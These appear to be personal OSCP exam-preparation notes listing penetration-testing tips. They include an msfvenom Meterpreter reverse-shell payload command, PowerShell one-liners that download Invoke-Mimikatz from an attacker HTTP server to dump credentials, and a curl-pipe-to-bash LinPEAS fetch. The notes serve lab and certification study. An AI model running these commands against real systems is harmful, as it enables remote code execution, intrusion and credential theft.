# OSCP Notes

### Quick Notes

* Transferring a file such as a .doc to a FTP share? Reminder to use `binary` before doing so or else it will upload as ASCII.&#x20;
* If you have a shell via Netcat on a Windows machine, try using Curl to download a  ps1 to the target and executing it.
  * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh -o meterpreter-64.ps1`
* Metasploit and Meterpreter are only allowed against one machine in the exam so ensure that you are sure before executing. There may be other ways to accomplish what you want (e.g., CrackMapExec, Lsassy, etc).&#x20;
* Unable to get Mimikatz onto a machine? Simply host a http server and execute the following:
  * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.1:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`&#x20;
  * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.164:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command lsadump::sam`
* If you are getting the following message `You are not a search engine. Permission denied.` when attempting to browse to robots.txt then set your user agent in Burp to the following:&#x20;
  * `User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)`
* If a login page default password doesn't work then think of what a lazy admin would use (uppercase and lowercase). CeWL can be used here if you're running out of ideas.
* If there are no writable directories then just pipe LinPEAS (or other tool of choice) directly into bash:
  * `curl 10.10.10.1:8080/linpeas.sh | bash`
* **REMEMBER KISS - Keep It Super Simple**. Several times I have tried to do something overly complicated when the first thing I would have tried would work.
* Oracle SQLi - [This link](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html) is beyond useful. Got me out of a situation where I was extremely stuck.&#x20;
